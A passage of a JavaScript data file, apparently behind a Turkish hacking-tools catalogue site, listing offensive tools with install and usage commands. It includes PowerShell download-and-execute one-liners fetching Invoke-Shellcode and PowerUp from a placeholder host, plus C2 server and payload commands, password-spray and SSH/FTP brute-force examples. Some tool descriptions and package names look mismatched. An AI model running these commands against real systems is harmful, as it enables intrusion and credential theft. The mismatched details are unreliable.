    usage: [{ title: 'Başlatma', code: 'powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString(\'http://IP/Inveigh.ps1\')"; Invoke-Inveigh' }]
  },
  {
    id: 'powersploit',
    name: 'PowerSploit',
    desc: 'PowerShell post-exploitation araç seti.',
    fullDesc: 'PowerSploit, PowerShell ile güvenlik testleri için kapsamlı bir araç setidir.',
    icon: 'fa-bolt',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['exploit'],
    tags: ['PowerShell', 'Post-Exploit'],
    tagColor: 'cyan',
    features: ['Code execution','Script injection','Dosya transferi','Yanıltma teknikleri','Privesc'],
    install: 'git clone https://github.com/PowerShellMafia/PowerSploit.git',
    usage: [{ title: 'PowerUp', code: 'powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString(\'http://IP/PowerUp.ps1\')"; Invoke-AllChecks' },{ title: 'Reverse', code: 'powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString(\'http://IP/Invoke-Shellcode.ps1\')"' }]
  },
  {
    id: 'rpcclient',
    name: 'RPCClient',
    desc: 'Samba RPC istemcisi - AD keşif aracı.',
    fullDesc: 'RPCClient, Samba\'nın RPC istemcisidir ve AD keşfi için kullanılır.',
    icon: 'fa-terminal',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['bilgi'],
    tags: ['RPC', 'AD'],
    tagColor: '',
    features: ['RPC bağlantı','Kullanıcı enumeration','Grup listeleme','SID lookup','Etki alanı keşfi'],
    install: 'sudo apt update && sudo apt install -y smbclient',
    usage: [{ title: 'Kullanıcılar', code: 'rpcclient -U "admin%pass123" 192.168.1.100 -c "enumdomusers"' },{ title: 'Domain', code: 'rpcclient -U "admin%pass123" 192.168.1.100 -c "enumdomgroups"' }]
  },
  {
    id: 'golem',
    name: 'Golem',
    desc: 'Gelişmiş LDAP enumeration aracı.',
    fullDesc: 'Golem, LDAP üzerinden kapsamlı AD keşfi yapar.',
    icon: 'fa-robot',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    cat: ['bilgi'],
    tags: ['LDAP', 'AD'],
    tagColor: 'purple',
    features: ['LDAP enumeration','Kullanıcı keşfi','Delegation tespiti','Trust relationship','JSON çıktı'],
    install: 'pip3 install gollem',
    usage: [{ title: 'Enum', code: 'golem -d hedef.com -u admin -p pass123 -s ldap://192.168.1.100' }]
  },
  {
    id: 'ldapsearch',
    name: 'LDAPSearch',
    desc: 'LDAP dizin sorgulama aracı.',
    fullDesc: 'LDAPSearch, LDAP protokolü üzerinde sorgulama yapar.',
    icon: 'fa-search',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['bilgi'],
    tags: ['LDAP', 'Sorgu'],
    tagColor: 'blue',
    features: ['LDAP sorgu','Nested groups','Object search','Filter desteği','Base DN keşfi'],
    install: 'sudo apt update && sudo apt install -y ldap-utils',
    usage: [{ title: 'Base', code: 'ldapsearch -x -H ldap://192.168.1.100 -b "dc=hedef,dc=com"' },{ title: 'Users', code: 'ldapsearch -x -H ldap://192.168.1.100 -D "cn=admin,dc=hedef,dc=com" -w pass123 -b "dc=hedef,dc=com" "(objectClass=user)"' }]
  },
  {
    id: 'silenttrinity',
    name: 'SilentTrinity',
    desc: 'Python C2 framework - asenkron ve stealth.',
    fullDesc: 'SilentTrinity, asenkron C2 framework\'üdür.',
    icon: 'fa-user-ninja',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['exploit'],
    tags: ['C2', 'Python'],
    tagColor: 'red',
    features: ['Asenkron C2','TCP/HTTP(S)/DNS','Zararlı yazılım','Modüler','Windows/Linux'],
    install: 'git clone https://github.com/byt3bl33d3r/SILENTTRINITY.git',
    usage: [{ title: 'Sunucu', code: 'python st.py teamserver IP PORT PASSWORD' },{ title: 'Client', code: 'python st.py client websocket ws://IP:PORT' }]
  },
  {
    id: 'poshc2',
    name: 'PoshC2',
    desc: 'PowerShell C2 framework - güçlü ve gizli.',
    fullDesc: 'PoshC2, PowerShell tabanlı bir C2 framework\'üdür.',
    icon: 'fa-terminal',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['exploit'],
    tags: ['C2', 'PowerShell'],
    tagColor: '',
    features: ['PowerShell implant','HTTP/HTTPS C2','DNS C2','Görsel panel','Modüler payload'],
    install: 'sudo apt update && sudo apt install -y poshc2',
    usage: [{ title: 'Sunucu', code: 'posh-server -p 443' },{ title: 'Payload', code: 'posh-payload -l https://server:443/payload' }]
  },
  {
    id: 'credmaster',
    name: 'CredMaster',
    desc: 'Password spray otomasyon aracı.',
    fullDesc: 'CredMaster, büyük ölçekli password spray saldırıları için otomatik bir araçtır.',
    icon: 'fa-shower',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['password'],
    tags: ['Password Spray', 'Otomasyon'],
    tagColor: 'orange',
    features: ['Kerberos/Office365/LDAP','Lockout avoidance','Multi-threaded','User enumeration','Logging'],
    install: 'pip3 install credmaster',
    usage: [{ title: 'Spray', code: 'credmaster -d hedef.com -u users.txt -p pass123 --ad' },{ title: 'O365', code: 'credmaster -d hedef.com -u users.txt -p pass123 --o365' }]
  },
  {
    id: 'pwned',
    name: 'Pwned-Or-Not',
    desc: 'Hesap ihlal kontrol aracı.',
    fullDesc: 'Pwned-Or-Not, belirli bir e-postanın veri ihlallerinde olup olmadığını kontrol eder.',
    ...
    tags: ['OSINT', 'Güvenlik'],
    tagColor: 'cyan',
    features: ['SSH brute-force','FTP brute-force','SMTP enumeration','Otomatik mod','Multi-thread'],
    install: 'pip3 install pwned-or-not',
    usage: [{ title: 'Mail', code: 'pwned-or-not email@hedef.com' }]
  },
  {
    id: 'urlhunter',
    name: 'URLHunter',
    desc: 'URL tabanlı bilgi toplama aracı.',
    fullDesc: 'URLHunter, URL adreslerinden bilgi toplar ve analiz eder.',
    icon: 'fa-bullseye',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['bilgi'],
    tags: ['URL', 'OSINT'],
    tagColor: 'red',
    features: ['Wayback uyumluluk','Grep elimizde','URL filtresi','Hızlı','Çıktı formatı'],
    install: 'cargo install urlhunter',
    usage: [{ title: 'Ara', code: 'urlhunter --keywords keywords.txt --date 2024-01-01' }]
  },
  {
    id: 'wordlistgen',
    name: 'WordlistGen',
    desc: 'Akıllı wordlist oluşturma aracı.',
    fullDesc: 'WordlistGen, hedef bilgilerine göre akıllı wordlist oluşturur.',
    icon: 'fa-file-lines',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    cat: ['password'],
    ...
    tagColor: 'purple',
    features: ['Özelleştirilebilir','Mutations','L33t speak','Numbers ekleme','Pattern'],
    install: 'pip3 install wordlistgen',
    usage: [{ title: 'Oluştur', code: 'wordlistgen -c hedef.txt -o wordlist.txt' }]
  },
  {
    id: 'legba',
    name: 'Legba',
    desc: 'Rust tabanlı çoklu protokol brute-force aracı.',
    fullDesc: 'Legba, Rust ile yazılmış hızlı çoklu protokol brute-force aracıdır.',
    icon: 'fa-bolt',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['password'],
    tags: ['Brute Force', 'Rust'],
    tagColor: '',
    features: ['260+ protokol','Çoklu thread','Async I/O','Session yönetimi','JSON çıktı'],
    install: 'cargo install legba',
    usage: [{ title: 'SSH', code: 'legba ssh --target 192.168.1.100:22 --username admin --password-list passwords.txt' },{ title: 'FTP', code: 'legba ftp --target 192.168.1.100:21 --username admin --password-list passwords.txt' }]
  }
];
